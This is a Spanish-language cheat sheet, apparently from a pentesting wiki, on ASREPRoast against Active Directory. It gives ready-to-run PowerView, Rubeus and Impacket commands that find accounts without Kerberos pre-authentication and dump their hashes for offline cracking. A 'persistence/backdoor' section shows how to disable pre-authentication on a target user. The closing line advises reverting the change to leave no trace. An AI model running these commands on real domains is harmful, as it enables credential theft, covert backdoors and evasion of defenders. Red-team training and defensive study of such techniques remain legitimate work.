---
title: "ASREPRoast Cheat Sheet"
description: "Ataque contra cuentas que tienen desactivada la pre-autenticación Kerberos."
image: "/images/wiki/10.png"
---

# ASREPRoast

**ASREPRoast** es una técnica que permite recuperar hashes de contraseñas de usuarios que tienen la propiedad `Do not require Kerberos preauthentication` habilitada. Esto significa que cualquiera puede pedir un ticket TGT para ese usuario al Controlador de Dominio, y el DC responderá con un ticket cifrado con la contraseña del usuario. Podemos capturar ese ticket y crackearlo offline.

[Repositorio Herramienta Específica](https://github.com/HarmJ0y/ASREPRoast) (Aunque Rubeus e Impacket también lo hacen).

## Identificación de Usuarios Vulnerables

### Con PowerView
```powershell
Get-DomainUser -PreauthNotRequired -Verbose
```

### Con AD Module
```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```

## Explotación (Obtener Hash)

### Con la herramienta ASREPRoast (PowerShell)
```powershell
# Obtener hash de un usuario específico
Get-ASREPHash -UserName <UserName> -Verbose

# Obtener hash de TODOS los vulnerables
Invoke-ASREPRoast -Verbose
```

### Con Rubeus
```powershell
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
```

### Con Impacket (Desde Linux)
```bash
python GetNPUsers.py <Domain>/ -usersfile users.txt -format hashcat -outputfile hashes.txt
```

## Persistencia / Backdoor

Si tienes permisos de escritura sobre un usuario (WriteProperty, GenericAll, etc.), puedes **activarle** esta vulnerabilidad para luego obtener su hash cuando quieras.

**PowerView:**
```powershell
# Activar "Do not require Kerberos preauthentication"
Set-DomainObject -Identity <TargetUser> -XOR @{useraccountcontrol=4194304} -Verbose

# Verificar
Get-DomainUser -PreauthNotRequired
```

No olvides revertir el cambio después del ataque para no dejar rastro.
